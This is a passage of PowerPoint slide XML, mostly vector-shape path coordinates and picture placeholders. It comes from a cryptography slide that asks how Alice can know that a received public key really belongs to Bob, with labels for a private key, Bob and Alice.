                    <a:pt x="210908" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167576" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167576" y="596061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="207860" y="587375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="587413"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210908" y="556818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175768" y="568807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="582955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="602107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="632663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141986" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121462" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="602107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145503" y="582955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127749" y="591248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105689" y="603326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85318" y="614959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66675" y="626135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50698" y="636143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68808" y="646049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87033" y="655066"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124701" y="670661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="161975" y="681837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="200456" y="688771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="279285" y="687425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="327342" y="672236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="327342" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370662" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370662" y="627037"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="354164" y="587375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326440" y="559054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326440" y="634707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="307416" y="644334"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298780" y="647293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298780" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="325221" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326440" y="634707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="326440" y="559054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="319227" y="554951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="319227" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298780" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298780" y="592848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="318236" y="605853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="319227" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="319227" y="554951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="314782" y="552411"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="545553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="588035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="654596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="660222"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="630453"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232537" y="587616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="588035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="545553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282257" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="296595" y="360337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="312204" y="373341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="328688" y="382333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="344614" y="387565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="377151" y="386219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="407428" y="373341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="424967" y="353034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="452932" y="320687"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="463296" y="287439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="464997" y="269760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="462838" y="252476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="451573" y="216674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="446290" y="208470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="442925" y="203238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433374" y="191630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422198" y="182511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422198" y="292595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411746" y="321487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="401840" y="334022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="388861" y="343966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="364540" y="353034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="342480" y="349161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="322986" y="331876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="306146" y="300761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206946" y="299059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="181432" y="290855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="177584" y="274116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="182270" y="265430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190550" y="258495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="216065" y="254177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248107" y="254177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248107" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275551" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275691" y="253822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="254177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276669" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277583" y="253377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277571" y="252564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="287489" y="243471"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298310" y="233883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="319570" y="220129"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="356793" y="208470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="387057" y="214972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="408774" y="234353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="420852" y="261581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422122" y="290855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422198" y="292595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422198" y="182511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="409587" y="175691"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="382739" y="169189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="322986" y="180441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="293547" y="197650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="277012" y="212598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276987" y="209740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276898" y="203720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276796" y="195948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276707" y="189014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276580" y="180009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276466" y="171805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="276440" y="170091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275818" y="123837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="275805" y="123050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159372" y="123837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145072" y="151066"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132549" y="168757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113893" y="180009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93967" y="180809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58026" y="159283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39446" y="117017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41148" y="92405"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52882" y="67348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62344" y="55727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74041" y="47967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102603" y="44919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="137299" y="57873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157226" y="70764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178384" y="88087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294894" y="89789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411302" y="111315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="461124" y="135572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="501396" y="171805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="528256" y="222745"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="537349" y="290855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="537349" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="582307" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="582307" y="672122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="590600" y="676249"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="610069" y="681024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="645121" y="678853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="674573" y="662813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="694486" y="636143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="695744" y="631355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="703592" y="601624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="699719" y="561873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="679805" y="520407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="652500" y="490245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="641235" y="480288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="655116" y="468236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="667194" y="456145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="687552" y="432435"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="710082" y="386219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="710082" y="3275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60" name="object 31"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId13"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6330240" y="2828160"/>
              <a:ext cx="230040" cy="217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61" name="object 32"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6254640" y="2821680"/>
              <a:ext cx="46800" cy="1576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46989" h="158114" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="22975" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="116" y="157095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="157892"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46784" y="157095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2297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917813785" name="object 33"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId14"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4648320" y="2401560"/>
            <a:ext cx="690120" cy="950760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2083766695" name="object 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1858320" y="2666519"/>
            <a:ext cx="21816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3200" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>?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220512" name="object 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="610560" y="5094360"/>
            <a:ext cx="6771240" cy="12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346040" indent="-1333440">
              <a:lnSpc>
                <a:spcPct val="117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2400" b="0" u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Problem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: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How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does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Alice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know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key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she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received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really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Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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key?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975901" name="object 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6964200" y="3133800"/>
            <a:ext cx="1218960" cy="520920"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 1218960"/>
              <a:gd name="textAreaRight" fmla="*/ 1219320 w 1218960"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 520920"/>
              <a:gd name="textAreaBottom" fmla="*/ 521280 h 520920"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="1219200" h="521335" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="203199" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="507999" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1219199" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1219199" y="193542"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1219199" y="276490"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1219199" y="331787"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="507999" y="331787"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="325452" y="520707"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="203199" y="331787"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="331787"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="276490"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="193542"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="19049">
            <a:solidFill>
              <a:srgbClr val="008F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897391" name="object 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6204960" y="3146400"/>
            <a:ext cx="1845720" cy="1248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85104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008000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>private</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-66">
                <a:solidFill>
                  <a:srgbClr val="008000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008000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>key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851040">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1579"/>
              </a:spcBef>
              <a:defRPr/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defRPr/>
            </a:pP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Bob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429044" name="object 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1983600" y="4055760"/>
            <a:ext cx="54432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Alice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1971863" name="object 39"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6888240" y="4052519"/>
            <a:ext cx="1294920" cy="833760"/>
            <a:chOff x="6888240" y="4052519"/>
            <a:chExt cx="1294920" cy="833760"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="469" name="object 40"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId15"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7385039" y="4237200"/>
              <a:ext cx="115560" cy="118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0" name="object 41"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6900840" y="4062240"/>
              <a:ext cx="599760" cy="287280"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 599760"/>
                <a:gd name="textAreaRight" fmla="*/ 600120 w 599760"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 287280"/>
                <a:gd name="textAreaBottom" fmla="*/ 287640 h 287280"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="600075" h="287654" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="600075" y="117881"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="170865" y="115493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168490" y="1397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118198" y="3771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118084" y="9118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116992" y="9055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116992" y="64287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113652" y="233172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60985" y="232181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58750" y="67487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116992" y="64287"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116992" y="9055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56362" y="5473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56235" y="2387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4762" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="282587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167297" y="287350"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="171856" y="178003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="596519" y="173240"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="600075" y="117881"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFD3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71" name="object 42"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId16"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6929280" y="4070519"/>
              <a:ext cx="140760" cy="252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2" name="object 43"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6907320" y="4210200"/>
              <a:ext cx="592200" cy="135000"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 592200"/>
                <a:gd name="textAreaRight" fmla="*/ 592560 w 59220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592454" h="135254" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="592138" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="136968" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136968" y="112778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24415" y="111591"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="131574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162972" y="134938"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="167538" y="27106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="585190" y="27106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="592138" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFA9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3" name="object 44"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6888240" y="4052519"/>
              <a:ext cx="652320" cy="313200"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 652320"/>
                <a:gd name="textAreaRight" fmla="*/ 652680 w 652320"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 313200"/>
                <a:gd name="textAreaBottom" fmla="*/ 313560 h 313200"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="652779" h="313689" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="141287" y="57150"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="113169" y="57150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="57480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="86055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85255" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85255" y="86055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="86055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113169" y="57480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85255" y="57480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85255" y="57150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="57150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="57480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="86055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57150" y="256540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="256540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="227330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="86055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="57480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141287" y="57150"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="652779" h="313689" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="652462" y="156870"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="623887" y="114630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="114630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="29210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437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171450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="313690"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="313690"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="198755"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="511175" y="198755"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="511175" y="170180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198285" y="170180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="170180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170802" y="171450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170078" y="171450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170078" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28346" y="284480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28346" y="171450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28346" y="29210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="29210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="114630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="142925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169862" y="143205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="143205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198437" y="142925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595503" y="142925"/>
                  </a:lnTo>
                  <a:lnTo>
